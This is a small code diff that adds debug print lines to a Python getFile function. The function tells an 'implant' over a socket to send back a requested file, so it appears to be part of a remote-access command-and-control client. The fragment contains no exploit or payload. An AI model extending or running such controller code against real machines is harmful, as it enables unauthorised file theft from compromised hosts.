@@ -23,12 +23,15 @@ Returns:
 def getFile(sock, filepath, outfilepath, overwrite):
     try:
         # First tell our implant we want a get file performed
+        print("Sending command...")
         sock.send(bytes(str(GET), "utf-8") + b"\x00")
 
         # Send filepath
+        print("Sending filepath...")
         sock.send(filepath + b'\x00')
 
         # Wait for response (should be success code followed by file contents)
+        print("Sent data to implant; waiting on response code...")
         data = sock.recv(1024)
         data = data.strip()
         data = data.decode('utf-8')
